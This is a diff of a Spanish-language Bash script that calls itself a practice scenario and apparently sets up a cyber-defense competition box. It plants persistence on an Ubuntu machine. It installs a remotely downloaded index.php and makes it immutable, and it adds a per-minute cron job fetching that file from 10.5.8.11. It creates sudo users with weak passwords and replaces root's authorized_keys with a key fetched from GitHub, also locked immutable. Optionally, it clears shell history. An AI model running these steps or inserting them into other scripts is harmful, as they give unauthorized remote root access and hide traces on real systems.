@@ -1,139 +1,212 @@
 #!/usr/bin/env bash
+set -Eeuo pipefail
 
-# Lista de paquetes a instalar
-paquetes=("nano" "curl" "git" "php" "httpd")
+# Redhavi: escenario de practica para Ubuntu.
+WEB_REPO="https://github.com/banago/simple-php-website.git"
+INDEX_URL="https://raw.githubusercontent.com/4rji/ccdc/main/index.php"
+SSH_KEY_URL="https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub"
+LAB_SERVER="10.5.8.11"
 
-# Función para verificar si un paquete está instalado (Debian/Ubuntu/Kali)
-paquete_instalado_apt() {  
-    dpkg -l "$1" | grep -q '^ii'  
+WEB_ROOT="/var/www/simple-php-website"
+AUTH_FILE="/root/.ssh/authorized_keys"
+CRON_LINE="* * * * * curl -o ${WEB_ROOT}/index.php http://${LAB_SERVER}/index.php"
+
+PACKAGES=(
+    nano
+    curl
+    git
+    php
+    libapache2-mod-php
+    apache2
+    cron
+    e2fsprogs
+)
+
+log() {
+    printf '[redhavi] %s\n' "$*"
 }
 
-# Función para verificar si un paquete está instalado (CentOS/RHEL)
-paquete_instalado_yum() {
-    yum list installed "$1" &> /dev/null
+warn() {
+    printf '[redhavi][WARN] %s\n' "$*" >&2
 }
 
-# Función para verificar si un paquete está instalado (Fedora)
-paquete_instalado_dnf() {
-    dnf list installed "$1" &> /dev/null
+die() {
+    printf '[redhavi][ERROR] %s\n' "$*" >&2
+    exit 1
 }
 
-# Función para verificar si un paquete está instalado (Arch Linux)
-paquete_instalado_pacman() {
-    pacman -Qi "$1" &> /dev/null
+require_root() {
+    if [ "$(id -u)" -ne 0 ]; then
+        die "Este script debe ejecutarse como root. Usa: sudo $0"
+    fi
 }
 
-# Detectar el sistema operativo
-if [ -f /etc/os-release ]; then
+require_ubuntu() {
+    if [ ! -r /etc/os-release ]; then
+        die "No se pudo detectar el sistema operativo."
+    fi
+
+    # shellcheck disable=SC1091
     . /etc/os-release
-    OS=$ID
-fi
 
-# Instalar paquetes basados en el sistema operativo
-for paquete in "${paquetes[@]}"; do
-    case $OS in
-        "debian"|"ubuntu"|"kali")
-            if ! paquete_instalado_apt "$paquete"; then
-                echo "Instalando el paquete $paquete..."
-                sudo apt-get install -y "$paquete"
-            fi
-            ;;
-        "centos"|"rhel")
-            if ! paquete_instalado_yum "$paquete"; then
-                echo "Instalando el paquete $paquete..."
-                sudo yum install -y "$paquete"
-            fi
-            ;;
-        "fedora")
-            if ! paquete_instalado_dnf "$paquete"; then
-                echo "Instalando el paquete $paquete..."
-                sudo dnf install -y "$paquete"
-            fi
-            ;;
-        "arch")
-            if ! paquete_instalado_pacman "$paquete"; then
-                echo "Instalando el paquete $paquete..."
-                sudo pacman -S --noconfirm "$paquete"
-            fi
-            ;;
-        *)
-            ;;
-    esac
-done
+    if [ "${ID:-}" != "ubuntu" ]; then
+        die "Este script esta preparado para Ubuntu. Detectado: ${PRETTY_NAME:-desconocido}"
+    fi
+}
 
+install_packages() {
+    log "Instalando paquetes para Ubuntu..."
+    apt-get update
+    DEBIAN_FRONTEND=noninteractive apt-get install -y "${PACKAGES[@]}"
+}
 
+remove_immutable() {
+    local file=$1
 
+    if [ -e "$file" ] && command -v chattr >/dev/null 2>&1; then
+        chattr -i "$file" 2>/dev/null || true
+    fi
+}
 
+make_immutable() {
+    local file=$1
 
-# Clonar el repositorio a /var/www
-sudo git clone https://github.com/banago/simple-php-website.git /var/www/simple-php-website
+    if command -v chattr >/dev/null 2>&1; then
+        chattr +i "$file" || warn "No se pudo aplicar chattr +i a $file"
+    else
+        warn "chattr no esta disponible; $file no quedo inmutable"
+    fi
+}
 
-# Descargar index.php a /var/www/simple-php-website
-sudo curl -o /var/www/simple-php-website/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php
-sudo curl -o /var/www/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php
-sudo curl -o /var/www/html/index.php https://raw.githubusercontent.com/4rji/ccdc/main/index.php
+download_file() {
+    local url=$1
+    local output=$2
 
+    remove_immutable "$output"
+    curl -fsSL -o "$output" "$url"
+}
 
-# Aplicar el atributo inmutable al archivo index.php
-sudo chattr +i /var/www/simple-php-website/index.php
+setup_web() {
+    log "Preparando archivos web..."
+    mkdir -p /var/www /var/www/html
 
-# Añadir tarea a crontab
-(crontab -l 2>/dev/null; echo "* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php") | sudo crontab -
-(crontab -l 2>/dev/null; echo "* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php") | crontab -
+    if [ -d "$WEB_ROOT/.git" ]; then
+        log "Repositorio web existente, intentando actualizarlo..."
+        git -C "$WEB_ROOT" pull --ff-only || warn "No se pudo actualizar $WEB_ROOT; continuo con el contenido actual"
+    elif [ -d "$WEB_ROOT" ] && [ -n "$(find "$WEB_ROOT" -mindepth 1 -maxdepth 1 -print -quit)" ]; then
+        warn "$WEB_ROOT ya existe y no es un repositorio git; no se clona encima"
+    else
+        git clone "$WEB_REPO" "$WEB_ROOT"
+    fi
 
-# Iniciar y habilitar httpd
-sudo systemctl start httpd 2>/dev/null
-sudo systemctl enable httpd 2>/dev/null
+    download_file "$INDEX_URL" "$WEB_ROOT/index.php"
+    download_file "$INDEX_URL" "/var/www/index.php"
+    download_file "$INDEX_URL" "/var/www/html/index.php"
 
+    make_immutable "$WEB_ROOT/index.php"
+}
 
+install_cron_job() {
+    local tmp_cron
 
+    log "Configurando cron sin duplicar entradas..."
+    tmp_cron="$(mktemp)"
+    crontab -l > "$tmp_cron" 2>/dev/null || true
 
-# Requiere ejecutarse como root
-if [ "$(id -u)" != "0" ]; then
-   echo "Este script debe ser ejecutado como root" 1>&2
-   exit 1
-fi
+    if grep -Fxq "$CRON_LINE" "$tmp_cron"; then
+        log "La entrada de cron ya existe."
+    else
+        printf '%s\n' "$CRON_LINE" >> "$tmp_cron"
+        crontab "$tmp_cron"
+        log "Entrada de cron agregada."
+    fi
 
-# Crear el primer usuario con home directory
-useradd -m ccdc -G sudo
-echo "ccdc:ccdc" | chpasswd
-passwd --expire ccdc
+    rm -f "$tmp_cron"
+}
 
-# Crear el segundo usuario sin home directory
-useradd splunk -G sudo -M
-echo "splunk:ass" | chpasswd
+enable_apache() {
+    log "Iniciando y habilitando apache2..."
+    systemctl enable --now apache2
+}
 
-echo "Usuarios creados y añadidos al grupo sudo. Contraseñas establecidas."
+ensure_admin_group() {
+    if ! getent group sudo >/dev/null 2>&1; then
+        groupadd sudo
+    fi
+}
 
+ensure_user() {
+    local user=$1
+    local password=$2
+    local home_mode=$3
 
+    if id "$user" >/dev/null 2>&1; then
+        log "Usuario $user ya existe; asegurando grupo sudo y contrasena de practica."
+        usermod -aG sudo "$user"
+    else
+        log "Creando usuario $user..."
+        case "$home_mode" in
+            with-home)
+                useradd -m -G sudo "$user"
+                ;;
+            no-home)
+                useradd -M -G sudo "$user"
+                ;;
+            *)
+                die "Modo de home invalido para $user: $home_mode"
+                ;;
+        esac
+    fi
 
+    printf '%s:%s\n' "$user" "$password" | chpasswd
+}
 
+setup_users() {
+    log "Configurando usuarios de practica..."
+    ensure_admin_group
 
+    ensure_user "ccdc" "ccdc" "with-home"
+    passwd --expire ccdc
 
-# URL de tu clave pública
-URL_CLAVE="https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub"
+    ensure_user "splunk" "ass" "no-home"
 
-mkdir -p /root/.ssh
+    log "Usuarios configurados y agregados al grupo sudo."
+}
 
+setup_root_ssh_key() {
+    log "Configurando llave SSH para root..."
+    mkdir -p /root/.ssh
+    chmod 700 /root/.ssh
 
-# Descargar y agregar la clave pública al archivo authorized_keys
-wget -O /root/.ssh/authorized_keys $URL_CLAVE
-chmod 600 /root/.ssh/authorized_keys
+    download_file "$SSH_KEY_URL" "$AUTH_FILE"
+    chmod 600 "$AUTH_FILE"
+    make_immutable "$AUTH_FILE"
 
+    log "Llave SSH publica instalada para root."
+}
 
-chattr +i /root/.ssh/authorized_keys
+maybe_clear_history() {
+    if [ "${REDHAVI_CLEAR_HISTORY:-0}" = "1" ]; then
+        history -c 2>/dev/null || true
+        history -w 2>/dev/null || true
+        log "Historial borrado."
+    else
+        log "Historial no borrado. Usa REDHAVI_CLEAR_HISTORY=1 si quieres ese artefacto."
+    fi
+}
 
-echo "Clave SSH pública instalada para el usuario root."
+main() {
+    require_root
+    require_ubuntu
+    install_packages
+    setup_web
+    install_cron_job
+    enable_apache
+    setup_users
+    setup_root_ssh_key
+    maybe_clear_history
 
+    log "Escenario redhavi terminado."
+}
 
-#delete the apt update files
-#rm /etc/apt/* -rf
-
-
-sleep 1 
-
-history -c && history -w
-
-echo "Historial borrado"
-
-
+main "$@"
